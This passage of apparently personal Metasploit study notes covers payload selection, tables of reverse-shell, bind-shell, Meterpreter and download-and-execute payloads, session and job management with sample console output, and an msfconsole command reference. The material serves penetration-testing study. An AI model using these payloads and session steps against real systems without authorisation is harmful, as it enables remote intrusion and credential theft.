>    32  payload/windows/x64/meterpreter/reverse_tcp_rc4     .                normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
>    33  payload/windows/x64/meterpreter/reverse_tcp_uuid    .                normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
>    34  payload/windows/x64/meterpreter/reverse_winhttp     .                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
>    35  payload/windows/x64/meterpreter/reverse_winhttps    .                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
> ```

- Manually set a payload for an exploit:

```bash
set payload windows/x64/meterpreter/reverse_http
```

- Using search index:

```bash
set payload 28
```

>[!note] Although you do can set a payload manually, you don't have to — Metasploit sets one automatically. 
### Payload reference 

- Functional payload categories:
	- Shell payloads (e.g., `windows/shell_reverse_tcp`).
	- Meterpreter payloads (e.g., `windows/meterpreter/reverse_tcp`).
	- Command execution (e.g., `windows/exec`, `cmd/unix/reverse_perl`).
	- Web payloads (e.g., `php/meterpreter/reverse_tcp`, `java/meterpreter/reverse_tcp`).
	- Download & execute (e.g., `windows/download_exec`).
- Connection types:
	- Reverse payloads (e.g., `reverse_tcp`, `reverse_https`).
		- `reverse_*` → target connects to you.
	- Bind payloads (e.g., `bind_tcp`).
		- `bind_*` → you connect to target.
	- HTTP/HTTPS payloads (e.g., `reverse_http`, `reverse_https`).
- Stagers (transport variants):
	- `reverse_tcp` -> Direct TCP connection (fast, detectable).
	- `reverse_http` -> HTTP-based communication.
	- `reverse_https` -> Encrypted HTTPS communication.
	- `bind_tcp` -> Target listens, attacker connects.
- Stages (capability):
	- `meterpreter` → advanced in-memory agent.
	- `shell` → basic command shell.
	- `vncinject` -> VNC GUI session.

- Meterpreter payloads:

| Payload                                 | Notes                                                     |
| --------------------------------------- | --------------------------------------------------------- |
| `windows/x64/meterpreter/reverse_tcp`   | Default choice for modern Windows targets.                |
| `windows/meterpreter/reverse_tcp`       | 32-bit Windows; use when target is confirmed x86.         |
| `windows/x64/meterpreter/reverse_http`  | Blends with web traffic; works through web proxies.       |
| `windows/x64/meterpreter/reverse_https` | Encrypted, harder to detect; better for long-term access. |
| `windows/meterpreter_reverse_tcp`       | Stageless; more reliable when staging fails.              |
| `linux/x64/meterpreter/reverse_tcp`     | Modern Linux targets.                                     |
| `linux/x86/meterpreter/reverse_tcp`     | 32-bit Linux.                                             |
| `php/meterpreter/reverse_tcp`           | Web app exploitation via PHP RCE.                         |
| `java/meterpreter/reverse_tcp`          | Cross-platform via JVM; useful when OS is unclear         |
| `android/meterpreter/reverse_tcp`       | Android payload packaged as APK; used in mobile testing.  |

- Shell payloads (for when Meterpreter isn't available):

| Payload                         | Notes                                      |
| ------------------------------- | ------------------------------------------ |
| `windows/x64/shell/reverse_tcp` | Staged Windows reverse shell.              |
| `windows/shell_reverse_tcp`     | Stageless; very reliable.                  |
| `linux/x64/shell_reverse_tcp`   | 64-bit Linux reverse shell.                |
| `linux/x86/shell/reverse_tcp`   | 32-bit Linux.                              |
| `cmd/unix/reverse_bash`         | Pure Bash reverse shell.                   |
| `cmd/unix/reverse`              | Generic Unix reverse shell.                |
| `cmd/unix/reverse_perl`         | Perl-based; useful when Perl is available. |
| `cmd/unix/reverse_netcat`       | Netcat reverse shell.                      |
| `cmd/unix/bind_netcat`          | Netcat bind shell.                         |
| `windows/shell/bind_tcp`        | Staged bind shell.                         |
| `windows/shell_bind_tcp`        | Stageless bind shell.                      |

- Command execution (fire-and-forget, no persistent session):

| Payload           | Description                                 |
| ----------------- | ------------------------------------------- |
| `windows/exec`    | Executes a command on the target and exits. |
| `cmd/unix/exec`   | Executes command on Unix system.            |
| `windows/adduser` | Adds a new user to the system.              |

- Web and scripting payloads:

| Payload                       | Description                |
| ----------------------------- | -------------------------- |
| `php/reverse_php`             | Simple PHP reverse shell.  |
| `php/meterpreter_reverse_tcp` | Stageless PHP Meterpreter. |
| `java/jsp_shell_reverse_tcp`  | JSP-based reverse shell.   |
| `ruby/shell_reverse_tcp`      | Ruby reverse shell.        |
| `nodejs/shell_reverse_tcp`    | Node.js reverse shell.     |

- Download & execute:

| Payload                     | Description                                     |
| --------------------------- | ----------------------------------------------- |
| `windows/download_exec`     | Download and execute a file from remote server. |
| `windows/download_exec_ssl` | Same as above but over HTTPS.                   |
| `windows/url_download_exec` | Fetches payload via URL and executes.           |

- GUI / advanced interaction:

| Payload                         | Description                         |
| ------------------------------- | ----------------------------------- |
| `windows/vncinject/reverse_tcp` | Injects VNC server for GUI control. |
| `windows/vncinject/bind_tcp`    | Bind version of VNC injection.      |

>[!tip]+
>You can create your own payloads with `msfvenom`. See [[msfvenom]].

## Sessions

> A **session** in Metasploit is a persistent, interactive connection to a compromised target system, established after successful payload execution and managed by the framework.

Sessions are the **tangible result** of successful exploitation. They represent the payload running on the target and your communication channel to it. Without an active session, you can't interact with or control the compromised host.

- Each session provides an interface through which you can interact with the remote system, execute commands, run post-exploitation modules, and other.

>[!important] No session = no access.

- Sessions are numbered starting at `1` and persist across module changes — you can switch to a different module, configure it, run it, and your existing sessions remain active.

>[!note]+ How sessions are established
> 1. You run an exploit against a target.
> 2. The exploit successfully delivers a payload.
> 3. The payload executes on the target and connects back to your Metasploit console (or opens a port for you to connect to).
> 4. This established connection is registered as a session and is assigned a numerical ID.

Metasploit supports two main types of sessions:

- **Shell sessions**
	- **Shell sessions** provide a standard command-line interface to the target — `cmd.exe` on Windows, `/bin/bash` or `/bin/sh` on Linux/Unix. similar to SSH or Telnet access.
	- This can be `cmd.exe` on Windows, `/bin/sh` or `/bin/bash` on Linux/Unix that allow you to run operating system commands directly.
	- Shell sessions are simpler and are easier to establish than Meterpreter, but they're limited: no built-in flie upload/download, no pivoting, no keylogging — you do everything manually.

- **Meterpreter**
	- **Meterpreter sessions** are significantly more powerful and feature-rich than basic shells. They provide access to Metasploit's entire post-exploitation framework, including hundreds of specialized modules for privilege escalation, credential harvesting, network pivoting, lateral movement, and system manipulation. 
	- Metasploit attempts to deliver Meterpreter payloads by default because of their superior capabilities, and falls back to shell sessions if upload is unsuccessful.

### Managing sessions

- List all active sessions:

```bash
sessions -l
```
```bash
sessions
```

- Interact with a session (drop into its shell/Meterpreter prompt):

```bash
session -i <session_ID>
```

>[!example]+ 
> ```bash
> msf6> session -i 1
> [*] Starting interaction with 1...
> 
> meterpreter > 
> ```


- Background the current session without killing it (`Ctrl+Z` also works):

```bash
background
```

>[!example]+ 
> ```bash
> meterpreter > background
> [*] Backgrounding session 1...
> msf6 >
> ```

- Terminate a session:

```bash
sessions -k 1
```

- Attempt to upgrade a basic shell session to a Meterpreter session:

```bash
sessions -u 1
```

>[!example]+
> ```bash
> msf6 > sessions -u 1
> 
> [*] Upgrading session ID: 1
> [*] Starting exploit/multi/handler
> [*] Started reverse TCP handler on 192.168.1.11:4433
> [*] Sending stage (175174 bytes) to 192.168.1.5
> [*] Meterpreter session 3 opened
> ```

- Print detailed information about each session:

```bash
sessions -v
```

- Table format:

```bash
sessions -x
```

- Run a command against a specific session (or multiple sessions at once) without entering it:

```bash
sessions -c "whoami" -i 1
```

```bash
sessions -c "whoami" -i 1,2,3
```

## Jobs

> A **job** in Metasploit is a module execution instance running as a background process within `msfconsole`, decoupled from the interactive foreground.

- Jobs are processes running _on your machine_ — not on the target. 
- The most common use is running handlers or exploit listeners as background jobs while you continue working in the console.


>[!note]+ Jobs are managed with the `jobs` command in `msfconsole`
> 
> ```bash
> msf6> jobs -h
> Usage: jobs [options]
> 
> Active job manipulation and interaction.
> 
> OPTIONS:
> 
>     -K        Terminate all running jobs.
>     -P        Persist all running jobs on restart.
>     -S <opt>  Row search filter.
>     -h        Help banner.
>     -i <opt>  Lists detailed information about a running job.
>     -k <opt>  Terminate jobs by job ID and/or range.
>     -l        List all running jobs.
>     -p <opt>  Add persistence to job by job ID
>     -v        Print more detailed info. Use with -i and -l
> ```


- Run a module as a background job:

```bash
exploit -j
```
```bash
run -j
```

- List running jobs:

```bash
jobs -l
```

- Kill a job by ID:

```bash
jobs -k 0
```

- Kill all jobs:

```bash
jobs -K
```

- Get detailed info on a job:

```bash
jobs -i 0
```

## Resources and further reading

- [`Metasploit modules — Metasploit Docs`](https://docs.metasploit.com/docs/modules.html)
- [`Metasploit Framework 3.3.3 Exploit Rankings — Rapid7`](https://www.rapid7.com/blog/author/rapid7/)
- [`Exploit Ranking — Metasploit Docs`](https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html)
- [`Metasploit for Pentester: Sessions — Hacking Articles`](https://www.hackingarticles.in/metasploit-for-pentester-sessions/)
- [`Working with Payloads — Rapid7 Docs`](http://docs.rapid7.com/metasploit/working-with-payloads/)


## Appendix A: `msfconsole` command reference



- Core commands:

|Command|Description|
|---|---|
|`help` / `?`|Display the help menu with available commands.|
|`help <command>`|Show detailed help for a specific command.|
|`banner`|Display a random Metasploit banner.|
|`version`|Show Metasploit framework version.|
|`exit` / `quit`|Exit msfconsole.|
|`history`|Show command history.|
|`clear`|Clear the screen output.|
|`color`|Enable/disable colored output.|
|`sleep <seconds>`|Pause execution for a specified time.|
|`spool <file>`|Log console output to a file.|
|`threads`|View and manage background threads.|
|`tips`|Display useful Metasploit tips.|
|`connect <host> <port>`|Connect to a remote service (like netcat).|
|`debug`|Show debugging information.|

- Module commands:

|Command|Description|
|---|---|
|`search <keyword>`|Search for modules by name, description, CVE, or filters.|
|`use <module>`|Load a module by name or search index.|
|`use <index>`|Load module from search results by index.|
|`back`|Exit the current module context and return to main prompt.|
|`info`|Display detailed information about the selected module.|
|`show modules`|List all modules or by category.|
|`show exploits`|List exploit modules.|
|`show payloads`|Show payloads compatible with the selected module.|
|`show auxiliary`|List auxiliary modules.|
|`show post`|List post-exploitation modules.|
|`show options` /`options`|Display required and optional parameters for the current module.|
|`show missing`|Show required options that have not yet been set.|
|`show advanced`|Display advanced module options.|
|`show evasion`|Display evasion-related options.|
|`show targets`|Display supported targets for the module.|
|`set <option> <value>`|Set a module-specific option.|
|`setg <option> <value>`|Set a global option across modules.|
|`unset <option>`|Remove a module-specific option.|
|`unsetg <option>`|Remove a global option.|
|`advanced`|Show advanced options (alias behavior).|
|`reload_all`|Reload all modules from disk.|
|`loadpath <path>`|Load modules from a custom path.|
|`favorite <module>`|Add module to favorites.|
|`favorites`|List favorite modules.|
|`clearm`|Clear module stack.|
|`pushm`|Push current module to stack.|
|`popm`|Pop module from stack.|
|`previous`|Switch to previously used module.|
|`listm`|List module stack.|


- Exploitation & execution commands:

|Command|Description|
|---|---|
|`run`|Execute the selected module.|
|`exploit`|Execute exploit module (same as `run`).|
|`check`|Check if target is vulnerable without exploiting.|
|`rerun`|Re-run the last executed module.|
|`exploit -j`|Run exploit as a background job.|

- Payload & handler commands:

|Command|Description|
|---|---|
|`set PAYLOAD <payload>`|Specify payload for exploit.|
|`show payloads`|List compatible payloads.|
|`handler`|Start a payload handler as a background job.|

- Session management commands:

|Command|Description|
|---|---|
|`sessions`|List all active sessions.|
|`sessions -i <id>`|Interact with a specific session.|
|`sessions -k <id>`|Kill a session.|
|`sessions -u <id>`|Upgrade shell to Meterpreter.|
|`sessions -l`|List sessions (alternative flag).|
|`background`|Send current session to background.|
|`route`|Route traffic through a session (pivoting).|

- Job management:

|Command|Description|
|---|---|
|`jobs`|List running jobs.|
|`jobs -k <id>`|Kill a job.|
|`jobs -K`|Kill all jobs.|
|`rename_job <id>`|Rename a job.|

- Database:

|Command|Description|
|---|---|
|`db_status`|Show database connection status.|
|`db_connect`|Connect to a database.|
|`db_disconnect`|Disconnect from database.|
|`db_import <file>`|Import scan results (e.g., Nmap XML).|
|`db_export`|Export database contents.|
|`db_nmap`|Run Nmap scan and store results.|
|`db_stats`|Show database statistics.|
|`hosts`|List discovered hosts.|
|`services`|List services.|
|`vulns`|List vulnerabilities.|
|`notes`|List notes.|
|`loot`|List collected loot.|
|`workspace`|Manage workspaces.|

- Credential commands:

|Command|Description|
|---|---|
|`creds`|List stored credentials.|

- Resource script commands:

|Command|Description|
|---|---|
|`resource <file>`|Execute commands from a file.|
|`makerc <file>`|Save current commands to a resource file.|

---
- Plugin commands:

|Command|Description|
|---|---|
|`load <plugin>`|Load a Metasploit plugin.|
|`unload <plugin>`|Unload a plugin.|

- Developer / advanced commands:

|Command|Description|
|---|---|
|`edit`|Edit current module in editor.|
|`irb`|Open interactive Ruby shell.|
|`pry`|Open Ruby debugger.|
|`log`|View framework logs.|
|`reload_lib`|Reload Ruby libraries.|
|`time <command>`|Measure execution time of a command.|

---
- DNS commands:

|Command|Description|
|---|---|
|`dns`|Manage DNS resolution behavior in Metasploit.|

---
